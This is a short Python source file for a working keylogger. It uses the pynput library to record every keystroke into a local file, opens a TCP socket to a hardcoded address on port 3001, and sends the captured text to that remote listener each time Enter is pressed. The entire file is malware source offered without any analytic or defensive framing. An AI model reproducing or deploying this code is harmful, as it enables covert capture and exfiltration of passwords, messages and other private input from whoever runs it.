import socket
from pynput.keyboard import Key,Listener

keyboard=Listener()
data=""
pressed_keys=set()

Host='192.168.234.1'
port =3001

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((Host, port))

fname='key.txt'
client.send(fname.encode())

def on_press(key):
    with open("Key.txt","a") as a:
       global data
       try:
           pressed_keys.add(key)
           if hasattr(key,'char'):
              data+=key.char
           elif isinstance(key,Key):
               if (key.name!="shift" and key.name!="space" and key.name!="ctrl_l" and key.name!="ctrl_r"):
                   data+=" "+key.name+" "
               if (key.name=="enter"):
                   data+="\n"
                   print(data)
                   print("entering data")
                   a.write(data)
                   print("Sending data to server...")
                   client.send(data.encode())
                   data=""
               elif (key.name=="shift"):
                   pass
               elif (key.name=="space"):
                   data+=" "
               elif (key.name=="ctrl_l" or key.name=="ctrl_r") and hasattr(key,'char'):
                   data+=key.name+" "+key.char+" "
       except Exception as e:
           print(f"Error: {e}")


def on_release(key):
    print(key,"relaesed")
    pressed_keys.remove(key)
        
with Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()
